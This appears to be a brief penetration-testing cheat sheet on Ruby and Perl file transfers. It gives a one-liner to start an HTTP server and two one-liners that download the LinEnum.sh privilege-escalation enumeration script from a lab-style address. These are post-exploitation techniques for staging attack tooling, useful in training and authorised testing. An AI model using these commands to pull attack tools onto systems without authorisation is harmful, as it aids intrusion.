# Ruby & Perl File Transfers

## Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

## Ruby Download

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.10.32/LinEnum.sh")))'
```

---

## Perl Download

```bash
perl -e 'use LWP::Simple; getstore("http://10.10.10.32/LinEnum.sh", "LinEnum.sh");'
```
